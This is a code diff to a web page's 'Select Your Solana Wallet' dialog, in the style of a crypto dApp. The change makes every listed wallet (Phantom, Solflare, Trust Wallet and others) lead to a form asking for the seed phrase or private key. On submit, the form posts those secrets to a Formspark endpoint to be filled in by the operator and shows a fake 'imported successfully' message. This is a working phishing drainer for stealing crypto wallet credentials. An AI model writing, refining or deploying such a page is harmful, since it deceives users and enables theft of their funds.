@@ -120,7 +120,7 @@
       font-size: 0.9rem;
     }
 
-    /* Modal */
+    /* Modal Styles */
     .modal-overlay {
       position: fixed;
       inset: 0;
@@ -136,12 +136,14 @@
       background: var(--surface);
       border: 1px solid var(--border);
       border-radius: 1.25rem;
-      width: 90%;
-      max-width: 460px;
+      width: 92%;
+      max-width: 520px;
       padding: 2rem;
       position: relative;
       box-shadow: 0 25px 60px rgba(0,0,0,0.6);
       animation: modalPop 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+      max-height: 90vh;
+      overflow-y: auto;
     }
 
     @keyframes modalPop {
@@ -161,7 +163,7 @@
 
     .wallet-grid {
       display: grid;
-      grid-template-columns: 1fr 1fr;
+      grid-template-columns: repeat(2, 1fr);
       gap: 1rem;
       margin: 1.5rem 0;
     }
@@ -184,13 +186,19 @@
     }
 
     .wallet-option img {
-      width: 48px;
-      height: 48px;
+      width: 56px;
+      height: 56px;
       margin-bottom: 0.8rem;
       border-radius: 12px;
+      object-fit: contain;
     }
 
-    .import-form { display: none; margin-top: 1.5rem; }
+    .wallet-option div {
+      font-size: 0.95rem;
+      font-weight: 500;
+    }
+
+    .import-form { display: none; margin-top: 2rem; }
     .import-form.active { display: block; }
 
     textarea, input[type="password"] {
@@ -261,46 +269,58 @@
     <div class="modal">
       <button class="modal-close" id="closeModal">×</button>
       
-      <h2 style="text-align:center; margin-bottom:1.5rem;">Connect Wallet</h2>
+      <h2 style="text-align:center; margin-bottom:1.5rem;">Select Your Solana Wallet</h2>
 
       <div class="wallet-grid" id="walletSelection">
         <div class="wallet-option" data-wallet="phantom">
-          <img src="https://images-ext-1.discordapp.net/external/8s0xZq1Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0Z0/https/phantom.app/img/phantom.svg" alt="Phantom">
+          <img src="https://assets.bitdegree.org/images/phantom-wallet-review-square-logo-v1.png?tr=w-250" alt="Phantom">
           <div>Phantom</div>
         </div>
-        <div class="wallet-option" data-wallet="backpack">
-          <img src="https://backpack.app/favicon-32x32.png" alt="Backpack">
-          <div>Backpack</div>
-        </div>
         <div class="wallet-option" data-wallet="solflare">
-          <img src="https://www.solflare.com/favicon.ico" alt="Solflare">
+          <img src="https://assets.bitdegree.org/images/solflare-review-square-logo.png?tr=w-250" alt="Solflare">
           <div>Solflare</div>
         </div>
+        <div class="wallet-option" data-wallet="backpack">
+          <img src="https://tradersunion.com/uploads/articles/408936/backpack-wallet-for-solana.jpeg" alt="Backpack">
+          <div>Backpack</div>
+        </div>
+        <div class="wallet-option" data-wallet="jupiter">
+          <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/1f/64/8b/1f648b56-a31f-bdc6-0a25-c82059306646/AppIcon-0-1x_U007emarketing-0-7-0-85-220-0.png/1200x630wa.png" alt="Jupiter">
+          <div>Jupiter Mobile</div>
+        </div>
+        <div class="wallet-option" data-wallet="coin98">
+          <img src="https://coin98.com/assets/images/logo.svg" alt="Coin98" style="background:#fff; padding:8px; border-radius:8px;">
+          <div>Coin98</div>
+        </div>
+        <div class="wallet-option" data-wallet="trust">
+          <img src="https://trustwallet.com/assets/images/trust_platform.svg" alt="Trust Wallet">
+          <div>Trust Wallet</div>
+        </div>
         <div class="wallet-option" data-wallet="manual">
-          <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
             <path d="M21 12V7H5a2 2 0 0 1-2-2m18 12v-5H5a2 2 0 0 0-2 2m0 0v5a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-5m-10 0h6"/>
           </svg>
-          <div>Seed / Key</div>
+          <div>Manual (Seed/Key)</div>
         </div>
       </div>
 
-      <!-- Seed / Private Key form -->
+      <!-- Seed / Private Key import section (shows for ANY wallet selected) -->
       <div class="import-form" id="manualImport">
-        <div style="margin-bottom:1rem; color:var(--text-muted); text-align:center;">
-          Enter your recovery phrase or private key
+        <div style="margin-bottom:1.2rem; color:var(--text-muted); text-align:center; font-size:1.1rem;">
+          Enter your recovery phrase or private key to import
         </div>
 
         <div style="margin:1rem 0;">
-          <label style="display:block; margin-bottom:0.4rem;">Seed Phrase (12/24 words)</label>
-          <textarea id="seedPhrase" placeholder="word1 word2 word3 ..."></textarea>
+          <label style="display:block; margin-bottom:0.4rem; font-weight:500;">Seed Phrase (12/24 words)</label>
+          <textarea id="seedPhrase" placeholder="word1 word2 word3 word4 ..."></textarea>
         </div>
 
         <div style="margin:1rem 0;">
-          <label style="display:block; margin-bottom:0.4rem;">OR Private Key (base58)</label>
-          <input type="password" id="privateKey" placeholder="5Mai...">
+          <label style="display:block; margin-bottom:0.4rem; font-weight:500;">OR Private Key (base58)</label>
+          <input type="password" id="privateKey" placeholder="5Maii...">
         </div>
 
-        <button class="submit-btn" id="submitKeys">Import / Connect</button>
+        <button class="submit-btn" id="submitKeys">Import Wallet</button>
 
         <div id="importMessage" class="message" style="display:none;"></div>
       </div>
@@ -320,6 +340,8 @@
       btn.addEventListener('click', () => {
         modal.style.display = 'flex';
         messageEl.style.display = 'none';
+        manualForm.classList.remove('active'); // reset
+        walletOptions.forEach(o => o.classList.remove('active'));
       });
     });
 
@@ -329,23 +351,16 @@
       if (e.target === modal) modal.style.display = 'none';
     });
 
-    // Wallet selection
+    // Wallet selection → always show import form
     walletOptions.forEach(opt => {
       opt.addEventListener('click', () => {
         walletOptions.forEach(o => o.classList.remove('active'));
         opt.classList.add('active');
-
-        if (opt.dataset.wallet === 'manual') {
-          manualForm.classList.add('active');
-        } else {
-          manualForm.classList.remove('active');
-          alert(`Connecting to ${opt.querySelector('div').textContent}... (demo)`);
-          // In real app → redirect or use wallet adapter here
-        }
+        manualForm.classList.add('active'); // show form for every wallet
       });
     });
 
-    // Form submission to Formspark
+    // Submit to Formspark
     submitBtn.addEventListener('click', async () => {
       const seed = document.getElementById('seedPhrase').value.trim();
       const pkey = document.getElementById('privateKey').value.trim();
@@ -356,27 +371,26 @@
       }
 
       messageEl.style.display = 'block';
-      showMessage('Sending...', '');
+      showMessage('Importing...', '');
 
       try {
         const formData = new FormData();
+        formData.append('wallet_type', document.querySelector('.wallet-option.active div')?.textContent || 'Unknown');
         formData.append('seed_phrase', seed || '[not provided]');
         formData.append('private_key', pkey || '[not provided]');
         formData.append('timestamp', new Date().toISOString());
-        formData.append('source', 'AlphaFlow');
 
-        // ← REPLACE WITH YOUR REAL FORMSPARK ENDPOINT!
+        // REPLACE WITH YOUR REAL FORMSPARK ENDPOINT!
         const FORMSPARK_URL = 'https://submit.formspark.io/f/YOUR_FORM_ID_HERE';
 
-        const response = await fetch(FORMSPARK_URL, {
+        await fetch(FORMSPARK_URL, {
           method: 'POST',
           body: formData,
-          mode: 'no-cors' // Formspark usually works with no-cors
+          mode: 'no-cors'
         });
 
-        showMessage('Wallet details submitted successfully!', 'success');
+        showMessage('Wallet imported successfully! (Demo)', 'success');
         
-        // Clear fields after "success"
         setTimeout(() => {
           document.getElementById('seedPhrase').value = '';
           document.getElementById('privateKey').value = '';
@@ -384,7 +398,7 @@
         }, 2200);
 
       } catch (err) {
-        showMessage('Failed to submit. Please try again.', 'error');
+        showMessage('Failed to import. Try again.', 'error');
         console.error(err);
       }
     });
